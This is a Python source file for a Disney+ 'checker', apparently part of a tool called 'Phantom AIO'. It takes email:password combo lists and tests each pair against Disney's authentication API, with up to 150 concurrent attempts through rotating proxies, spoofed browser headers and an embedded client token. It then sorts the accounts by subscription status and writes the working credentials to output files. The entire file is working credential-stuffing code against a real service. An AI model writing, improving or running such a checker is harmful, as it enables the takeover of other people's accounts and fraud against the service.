import os
import json
import time
import ctypes
import asyncio
import aiohttp
import functools
import pystyle
import colorama
import easygui
import datetime
import traceback  # new import
from requests.adapters import HTTPAdapter, Retry
from colorama import Fore, Style
from pystyle import Write, System, Colors, Colorate
from threading import Lock
from random import choice

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

valid = 0
invalid = 0
custom = 0
proxy_error = 0
total_ver = 0
accounts_processed = 0
max_threads = 150
sema = asyncio.Semaphore(max_threads)  # Limit to 150 concurrent tasks

print()

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(
    f'『 Phantom AIO 』 ~ Disney+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')


def update_console_title():
    global valid, invalid, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(
        f'『 Phantom AIO 』 ~ Disney+ Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')


def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee


bad_proxies = []
locked_proxies = []
proxies = []
proxy_type = "http"
proxy_lock = Lock()


async def disney_checker(session, email, password):
    global valid, invalid, custom, proxy_error, total_ver, accounts_processed
    retries = 5
    timeout = 10
    for _ in range(retries):
        async with sema:
            try:
                with open("./proxies.txt", "r") as proxy_file:
                    proxy_list = proxy_file.readlines()

                proxy = (choice(proxy_list).strip() if proxy_list else None)

                if ":" in proxy and len(proxy.split(":")) == 4:
                    ip, port, user, pw = proxy.split(":")
                    proxy_string = f"http://{user}:{pw}@{ip}:{port}"
                    proxy_auth = aiohttp.BasicAuth(login=user, password=pw)  # Only assign when authentication is needed
                else:
                    ip, port = proxy.split(":")
                    proxy_string = f"http://{ip}:{port}"
                    proxy_auth = None  # No authentication required


                payload = {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "windows",
                    "attributes": {}
                }
                headers = {
                    "accept": "application/json",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://www.disneyplus.com",
                    "pragma": "no-cache",
                    "referer": "https://www.disneyplus.com/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "sec-gpc": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                    "x-bamsdk-client-id": "disney-svod-3d9324fc",
                    "x-bamsdk-platform": "windows",
                    "x-bamsdk-version": "4.16",
                }
                #print(f"Starting check for {email}")
                async with session.post('https://global.edge.bamgrid.com/devices', json=payload, headers=headers,
                                    proxy=proxy_string, proxy_auth=proxy_auth) as r:
                    if r.status == 403:
                        raise
                    resp = await r.json()
                    token = resp['assertion']

                    payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={token}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice"
                    headers = {
                        "accept": "application/json",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                async with session.post('https://global.edge.bamgrid.com/token', data=payload, headers=headers, proxy=proxy_string,
                                    proxy_auth=proxy_auth) as r:
                    resp = await r.text()  # await here
                    if 'unauthorized_client' in resp or 'invalid-token' in resp:  # using resp
                        raise
                    resp = await r.json()
                    auth_token = resp['access_token']

                    headers = {
                        "accept": "application/json; charset=utf-8",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": f"Bearer {auth_token}",
                        "cache-control": "no-cache",
                        "content-type": "application/json; charset=UTF-8",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                    payload = {
                        'email': email
                    }
                async with session.post('https://global.edge.bamgrid.com/idp/check', json=payload, headers=headers,
                                    proxy=proxy_string, proxy_auth=proxy_auth) as r:
                    resp = await r.text()  # await here
                    if "\"operations\":[\"Register\"]" in resp:  # using resp
                        time_rn = get_time_rn()
                        invalid += 1
                        accounts_processed += 1
                        update_console_title()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        return
                    elif "\"operations\":[\"OTP\"]" in resp:  # using resp
                        time_rn = get_time_rn()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        folder = "Checked/Disney"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        custom += 1
                        accounts_processed += 1
                        update_console_title()
                        with open("Checked/Disney/disney_custom.txt", "a+", encoding='utf-8') as cum:
                            cum.write(f"{email}:{password}" + "\n")
                        return
                    elif "\"operations\":[\"Login\",\"OTP\"]" not in resp:  # using resp
                        raise
                    headers = {
                        "accept": "application/json",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": f"Bearer {auth_token}",
                        "cache-control": "no-cache",
                        "content-type": "application/json",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                    payload = {
                        'email': email,
                        'password': password
                    }
                async with session.post('https://global.edge.bamgrid.com/idp/login', json=payload, headers=headers,
                                    proxy=proxy_string,
                                    proxy_auth=proxy_auth) as r:
                    resp = await r.text()  # await here
                    if 'Bad credentials sent for' in resp or 'is not a valid email Address at /email' in resp or "idp.error.identity.bad-credentials" in resp:  # using resp
                        invalid += 1
                        accounts_processed += 1
                        update_console_title()
                        time_rn = get_time_rn()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        return
                    if 'token_type' not in resp or 'id_token' not in resp:  # using resp
                        raise
                    resp = await r.json()
                    id_token = resp['id_token']

                    headers = {
                        "accept": "application/json",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": f"Bearer {auth_token}",
                        "cache-control": "no-cache",
                        "content-type": "application/json",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                    payload = {
                        'id_token': id_token
                    }
                async with session.post('https://global.edge.bamgrid.com/accounts/grant', json=payload, headers=headers,
                                    proxy=proxy_string,
                                    proxy_auth=proxy_auth) as r:
                    resp = await r.text()  # await here
                    if 'Account archived' in resp:  # using resp
                        time_rn = get_time_rn()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        invalid += 1
                        accounts_processed += 1
                        update_console_title()
                        return
                    resp = await r.json()
                    assertion = resp['assertion']
                    payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount"
                    headers = {
                        "accept": "application/json",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
                        "cache-control": "no-cache",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                async with session.post('https://global.edge.bamgrid.com/token', data=payload, headers=headers,
                                    proxy=proxy_string,
                                    proxy_auth=proxy_auth) as r:
                    resp = await r.json()
                    access_token = resp['access_token']
                    headers = {
                        "authorization": f"Bearer {access_token}",
                        "accept": "application/vnd.session-service+json; version=1",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9",
                        "cache-control": "no-cache",
                        "origin": "https://www.disneyplus.com",
                        "pragma": "no-cache",
                        "referer": "https://www.disneyplus.com/",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "sec-gpc": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-version": "4.16",
                    }
                async with session.get('https://global.edge.bamgrid.com/subscriptions', headers=headers, proxy=proxy_string,
                                   proxy_auth=proxy_auth) as response:
                    r = await response.text()  # await here
                    if r == '[]' or ("\"isActive\":false" in r and "\"isActive\":true" not in r):
                        time_rn = get_time_rn()
                        custom += 1
                        accounts_processed += 1
                        update_console_title()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        folder = "Checked/Disney"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        with open("Checked/Disney/disney_custom.txt", "a+", encoding='utf-8') as cum:
                            cum.write(f"{email}:{password}" + "\n")
                        return
                    else:
                        time_rn = get_time_rn()
                        valid += 1
                        accounts_processed += 1
                        update_console_title()
                        print(
                            f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                        folder = "Checked/Disney"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        with open("Checked/Disney/disney_valid.txt", "a+", encoding='utf-8') as cum:
                            cum.write(f"{email}:{password}" + "\n")
                        return
                    break
            except Exception as e:
                # traceback.print_exc()  # added to print the stack trace
                if isinstance(e, aiohttp.ClientHttpProxyError):
                    print(f"Proxy error occurred: {e}")
                    proxy_error += 1
                    update_console_title()
                #else:
                    #print(f"An error occurred: {e}")
                    # Print the traceback for more details about the exception
                    #traceback.print_exc()

async def disney_checker_task(email: str, password: str):
    retries = 5
    timeout = 10

    for _ in range(retries):
        try:
            async with aiohttp.ClientSession() as session:
                await disney_checker(session, email, password)
                break
        except aiohttp.ClientError:
            print('Network error, retrying...')
        except asyncio.TimeoutError:
            print('Timeout, retrying...')
        await asyncio.sleep(timeout)


async def disney_main():
    accounts = list(open('combos.txt', 'r').read().splitlines())
    tasks = []

    for account in accounts:
        email, password = account.split(':')
        task = asyncio.create_task(disney_checker_task(email, password))
        tasks.append(task)

    await asyncio.gather(*tasks)
